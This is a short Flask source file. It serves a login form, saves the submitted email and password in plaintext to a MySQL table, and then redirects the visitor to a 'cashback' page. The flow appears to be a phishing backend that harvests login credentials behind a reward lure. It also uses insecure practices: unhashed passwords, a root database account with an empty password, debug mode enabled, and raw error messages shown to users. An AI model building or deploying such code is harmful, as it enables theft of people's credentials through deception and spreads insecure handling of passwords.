from flask import Flask, render_template, request, redirect, url_for
import mysql.connector

app = Flask(__name__)

# Database connection
db_config = {
    'host': 'localhost',
    'user': 'root',
    'password': '',        # your MySQL password (keep empty if none)
    'database': 'login_db' # database name from MySQL
}

# Home page (Login form)
@app.route('/')
def home():
    return render_template('login.html')

# When form is submitted
@app.route('/save', methods=['POST'])
def save():
    email = request.form['email']
    password = request.form['password']

    try:
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO users (email, password) VALUES (%s, %s)", (email, password))
        conn.commit()
        cursor.close()
        conn.close()

        # After saving login details, redirect to cashback page
        return redirect(url_for('cashback'))
    except Exception as e:
        return f"<h3>Error: {str(e)}</h3>"

# Cashback page
@app.route('/cashback')
def cashback():
    return render_template('cashback.html')

if __name__ == '__main__':
    app.run(debug=True)
